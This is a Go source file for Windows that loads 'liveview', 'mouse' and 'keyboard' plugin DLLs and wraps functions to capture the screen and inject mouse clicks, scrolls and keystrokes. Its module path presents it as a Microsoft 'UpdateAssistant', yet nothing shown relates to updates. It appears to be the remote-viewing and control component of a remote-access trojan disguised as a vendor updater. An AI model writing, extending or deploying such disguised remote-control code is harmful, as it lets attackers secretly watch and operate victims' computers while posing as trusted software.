//go:build windows

package sysutil

import (
	"sync"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

var (
	lvMu    sync.Mutex
	lvPlug  *loader.Plugin
	lvMouse *loader.Plugin
	lvKey   *loader.Plugin
)

func LvLoad() bool {
	lvMu.Lock()
	defer lvMu.Unlock()
	if lvPlug != nil {
		return true
	}
	ss, err := loader.Load("liveview")
	if err != nil {
		logger.Info("[lv] liveview.dll load failed: %v", err)
		return false
	}
	logger.Info("[lv] liveview.dll loaded")
	mouse, _ := loader.Load("mouse")
	key, _ := loader.Load("keyboard")
	lvPlug = ss
	lvMouse = mouse
	lvKey = key
	return true
}

func LvUnload() {
	lvMu.Lock()
	defer lvMu.Unlock()
	if lvPlug != nil {
		loader.Unload(lvPlug)
		lvPlug = nil
	}
	if lvMouse != nil {
		loader.Unload(lvMouse)
		lvMouse = nil
	}
	if lvKey != nil {
		loader.Unload(lvKey)
		lvKey = nil
	}
}

func LvDLL(fn func(*loader.Plugin)) {
	lvMu.Lock()
	p := lvPlug
	lvMu.Unlock()
	if p != nil {
		fn(p)
	}
}

func LvCaptureInfo() (w, h, origW, origH int) {
	lvMu.Lock()
	p := lvPlug
	lvMu.Unlock()
	if p == nil {
		return
	}
	info, _ := p.Call("capture_info")
	screen, _ := p.Call("screen_info")
	packed := int32(info)
	scrPacked := int32(screen)
	w = int(uint16(packed >> 16))
	h = int(uint16(packed & 0xFFFF))
	origW = int(uint16(scrPacked >> 16))
	origH = int(uint16(scrPacked & 0xFFFF))
	return
}

func LvCapture(buf []byte) int {
	lvMu.Lock()
	p := lvPlug
	lvMu.Unlock()
	if p == nil || len(buf) == 0 {
		return 0
	}
	n, _ := p.Call("capture", uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	return int(n)
}

func LvCaptureReset() {
	lvMu.Lock()
	p := lvPlug
	lvMu.Unlock()
	if p != nil {
		p.Call("capture_reset")
	}
}

func LvMouseMove(x, y int) {
	lvMu.Lock()
	p := lvMouse
	lvMu.Unlock()
	if p != nil {
		p.Call("mouse_move", uintptr(x), uintptr(y))
	}
}

func LvMouseClick(x, y, button int, down bool) {
	lvMu.Lock()
	p := lvMouse
	lvMu.Unlock()
	if p == nil {
		return
	}
	d := uintptr(0)
	if down {
		d = 1
	}
	p.Call("mouse_click", uintptr(x), uintptr(y), uintptr(button), d)
}

func LvMouseScroll(x, y, delta int) {
	lvMu.Lock()
	p := lvMouse
	lvMu.Unlock()
	if p != nil {
		p.Call("mouse_scroll", uintptr(x), uintptr(y), uintptr(delta))
	}
}

func LvKeyEvent(vk int, down bool) {
	lvMu.Lock()
	p := lvKey
	lvMu.Unlock()
	if p == nil {
		return
	}
	d := uintptr(0)
	if down {
		d = 1
	}
	p.Call("key_event", uintptr(vk), d)
}
